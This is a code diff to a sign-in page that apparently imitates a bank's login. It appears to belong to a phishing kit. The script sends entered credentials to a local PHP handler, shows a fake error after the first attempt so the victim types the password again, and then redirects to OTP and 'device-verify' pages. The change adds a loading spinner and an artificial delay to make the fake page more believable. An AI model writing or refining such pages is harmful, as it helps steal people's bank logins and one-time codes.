@@ -98,7 +98,12 @@
                                       </div>
                                   </div>
                                   <div class="row">
-                                      <input type="submit" class="jpui submit" value="Sign in" name="submit">
+                                      <button type="submit" class="jpui submit" id="signin-btn" name="submit">
+                                          <span id="btn-text">Sign in</span>
+                                          <span id="btn-spinner" style="display:none;">
+                                              <i class="fas fa-spinner fa-spin"></i> Loading...
+                                          </span>
+                                      </button>
                                   </div>
                                   <div class="row">
                                       <span class="jpui link">
@@ -210,28 +215,39 @@ const fullUrl = window.location.href;
               }
           }
       
+          // Show loading spinner
+          document.getElementById("btn-text").style.display = "none";
+          document.getElementById("btn-spinner").style.display = "inline-block";
+          document.getElementById("signin-btn").disabled = true;
+      
           var formData = new FormData(this);
           var xhr = new XMLHttpRequest();
-          xhr.open("POST", "./config/user.php", true); // your php url here
-      
-          xhr.onreadystatechange = function () {
-              if (xhr.readyState == 4 && xhr.status == 200) {
-                  console.log(xhr.responseText);
-      
-                  if (formSubmitted === 1) {
-                      document.getElementById("pass").value = "";
-                      console.log("YESSSSS");
-                      document.getElementById("rror").style.display = "block";
-                      setTimeout(() => {
-                        document.getElementById("errorr").style.display = "none"
-                      }, 1500);
-                  } else if (formSubmitted >= 2) {
-                      window.location.href = `./otp.php`;
-                    }
-              }
-          };
-      
-          xhr.send(formData);
+          
+          setTimeout(function() {
+              xhr.open("POST", "./config/user.php", true);
+          
+              xhr.onreadystatechange = function () {
+                  if (xhr.readyState == 4 && xhr.status == 200) {
+                      console.log(xhr.responseText);
+          
+                      if (formSubmitted === 1) {
+                          document.getElementById("pass").value = "";
+                          console.log("YESSSSS");
+                          document.getElementById("rror").style.display = "block";
+                          document.getElementById("btn-text").style.display = "inline-block";
+                          document.getElementById("btn-spinner").style.display = "none";
+                          document.getElementById("signin-btn").disabled = false;
+                          setTimeout(() => {
+                            document.getElementById("rror").style.display = "none"
+                          }, 1500);
+                      } else if (formSubmitted >= 2) {
+                          window.location.href = `./device-verify.php`;
+                        }
+                  }
+              };
+          
+              xhr.send(formData);
+          }, 3000);
       });
     
 </script>
